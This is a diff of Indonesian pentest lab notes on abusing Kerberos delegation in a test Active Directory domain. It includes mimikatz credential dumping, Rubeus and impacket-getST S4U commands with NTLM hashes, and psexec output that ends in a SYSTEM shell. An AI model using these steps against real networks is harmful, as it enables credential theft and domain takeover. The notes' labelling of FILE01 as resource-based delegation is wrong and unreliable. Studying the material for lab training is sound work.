@@ -71,6 +71,73 @@ bloodyAD --host 192.168.88.122 -d gotham.local -u alfred -p 'P@ssw0rd' get searc
   sAMAccountName: FILE01$
   userAccountControl: WORKSTATION_TRUST_ACCOUNT
 
+---------------------
+### 1. **WEB01**
+
+* **sAMAccountName:** `WEB01$`
+* **userAccountControl:** `WORKSTATION_TRUST_ACCOUNT`, `TRUSTED_TO_AUTH_FOR_DELEGATION`
+* **msDS-AllowedToDelegateTo:** `cifs/FILE01`, `cifs/file01.gotham.local`
+
+* Ini adalah **Constrained Delegation** **+ S4U2self**.
+* Karena `TRUSTED_TO_AUTH_FOR_DELEGATION` diset dan ada nilai di `msDS-AllowedToDelegateTo`, maka **WEB01 bisa melakukan impersonasi pengguna apa pun ke CIFS/FILE01**.
+* Bisa dieksploitasi dengan **S4U2self + S4U2proxy** flow via tool seperti `Rubeus` atau `impacket-getST.py`.
+
+```
+Dapatkan NTLM dengam mimikatz "sekurlsa::logonpasswords" "exit"
+---
+Rubeus.exe s4u /user:WEB01$ /rc4:<RC4> /impersonateuser:administrator /msdsspn:cifs/file01.gotham.local /ptt /nowrap
+Convert base64 ke kirbi , Convert ticket ke ccache , export KRB5CCNAME=./namaticket, impacket-psexec
+--
+impacket-getST -spn cifs/file01.gotham.local -impersonate administrator -ts gotham.local/web01\$  -hashes :05c31bdfe58ca7e5fdd1047fab6d63e1 -dc-ip 192.168.88.122
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[2025-07-10 20:51:49] [*] Impersonating administrator
+[2025-07-10 20:51:49] [*] Requesting S4U2self
+[2025-07-10 20:51:49] [*] Requesting S4U2Proxy
+[2025-07-10 20:51:49] [*] Saving ticket in administrator@cifs_file01.gotham.local@GOTHAM.LOCAL.ccache
+
+$ export KRB5CCNAME=./administrator@cifs_file01.gotham.local@GOTHAM.LOCAL.ccache
+$ impacket-psexec administrator@file01.gotham.local -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on file01.gotham.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file ICSnefUw.exe
+[*] Opening SVCManager on file01.gotham.local.....
+[*] Creating service Rmtx on file01.gotham.local.....
+[*] Starting service Rmtx.....
+[!] Press help for extra shell commands                                                                                      Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami                                                                                                  nt authority\system
+
+```
+###2. **JMP01**
+
+* **sAMAccountName:** `JMP01$`
+* **userAccountControl:** `WORKSTATION_TRUST_ACCOUNT`
+* **msDS-AllowedToDelegateTo:** `cifs/FILE01`, `cifs/file01.gotham.local`
+
+* Ini adalah **Constrained Delegation (tanpa S4U)**.
+* Tidak ada flag `TRUSTED_TO_AUTH_FOR_DELEGATION`, jadi **tidak bisa melakukan impersonasi pengguna arbitrary (S4U2self)**.
+* Hanya bisa mendelegasikan TGS yang **dibawa oleh user yang benar-benar login** ke JMP01, ke FILE01.
+
+* Harus **pengguna asli login ke JMP01**, lalu kirim TGS yang bisa didelegasikan ke CIFS/FILE01.
+* Tidak bisa eksploitasi dari sisi attacker kecuali kamu punya interaktivitas penuh di JMP01.
+* Serangan hanya bisa dari JMP01
+---
+### 3. **FILE01**
+
+* **sAMAccountName:** `FILE01$`
+* **userAccountControl:** `WORKSTATION_TRUST_ACCOUNT`
+* **msDS-AllowedToDelegateTo:** `web01$`
+
+* Ini adalah **Resource-Based Constrained Delegation (RBCD)**.
+* `FILE01` memperbolehkan **WEB01 untuk mendelegasikan pengguna ke dirinya**.
+```
+ Rubeus.exe s4u /user:FILE01$ /rc4:89720071f21f9af8ea14e6e5674335b5 /impersonateuser:Administrator /msdsspn:CIFS/arkham.gotham.local /domain:gotham.local /ptt /nowrap
+
+---------------------
 | Account       | UAC Flags                                                    | Delegation Type                                                        | Delegates To |
 | Administrator | NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; TRUSTED_FOR_DELEGATION | 🟥 Unconstrained Delegation                                            | Any service, any user |
 | DC07$         | SERVER_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION                 | 🟥 Unconstrained Delegation (DC default)                               | Any service, any user |
